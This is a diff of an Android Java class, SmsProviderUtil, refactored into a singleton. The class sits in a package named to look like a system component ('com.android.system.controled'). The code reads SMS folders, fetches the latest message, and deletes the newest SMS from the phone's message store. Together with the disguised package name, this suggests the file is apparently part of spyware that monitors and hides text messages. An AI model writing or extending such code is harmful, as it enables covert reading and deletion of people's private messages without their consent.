@@ -7,14 +7,26 @@ import android.database.Cursor;
 import android.net.Uri;
 
 import com.android.system.controled.Debug;
+import com.android.system.controled.MainApplication;
 import com.android.system.controled.bean.SmsInfo;
 
 public class SmsProviderUtil {
 
-	private Context mContext;
+//	private Context mContext;
+	 
 
-	public SmsProviderUtil(Context con) {
-		this.mContext = con;
+	private static SmsProviderUtil mInstence;
+	
+	private SmsProviderUtil() {
+		
+	}
+	
+	public static SmsProviderUtil getInstence() {
+		if(mInstence == null) {
+			mInstence = new SmsProviderUtil();
+		}
+		
+		return mInstence;
 	}
 
 	/**
@@ -32,7 +44,7 @@ public class SmsProviderUtil {
 		ArrayList<SmsInfo> infos = new ArrayList<SmsInfo>();
 		// Cursor cusor = activity.managedQuery(uri, SmsUtil.SMS_COLUMNS, null, null, "date desc");
 		// Cursor cusor = activity.managedQuery(uri, SmsUtil.SMS_COLUMNS, null, null, null);
-		Cursor cusor = mContext.getContentResolver().query(Uri.parse(folder), SmsUtil.SMS_COLUMNS, null, null, null);
+		Cursor cusor = MainApplication.getInstence().getContentResolver().query(Uri.parse(folder), SmsUtil.SMS_COLUMNS, null, null, null);
 
 		int threadidColumn = cusor.getColumnIndex("thread_id");
 		int dateColumn = cusor.getColumnIndex("date");
@@ -76,7 +88,7 @@ public class SmsProviderUtil {
 	 */
 	public SmsInfo getLastSmsInfo() {
 		SmsInfo smsinfo = new SmsInfo();
-		Cursor cusor = mContext.getContentResolver().query(Uri.parse(SmsUtil.SMS_URI_ALL), SmsUtil.SMS_COLUMNS, null, null, null);
+		Cursor cusor = MainApplication.getInstence().getContentResolver().query(Uri.parse(SmsUtil.SMS_URI_ALL), SmsUtil.SMS_COLUMNS, null, null, null);
 
 		int threadidColumn = cusor.getColumnIndex("thread_id");
 		int dateColumn = cusor.getColumnIndex("date");
@@ -120,11 +132,11 @@ public class SmsProviderUtil {
 		String[] a = new String[] { "_id" };
 		Cursor cusor = null;
 		try {
-			cusor = mContext.getContentResolver().query(Uri.parse(SmsUtil.SMS_URI_ALL), a, null, null, null);
+			cusor = MainApplication.getInstence().getContentResolver().query(Uri.parse(SmsUtil.SMS_URI_ALL), a, null, null, null);
 			if (cusor != null) {
 				cusor.moveToFirst();
 				Debug.e("SmsProviderUtil", "delete id:" + cusor.getLong(0) + "All: " + cusor.getCount());
-				mContext.getContentResolver().delete(Uri.parse(SmsUtil.SMS_URI_ALL), "_id='" + cusor.getLong(0) + "'", null);
+				MainApplication.getInstence().getContentResolver().delete(Uri.parse(SmsUtil.SMS_URI_ALL), "_id='" + cusor.getLong(0) + "'", null);
 			}
 		} catch (Exception e) {
 			e.printStackTrace();
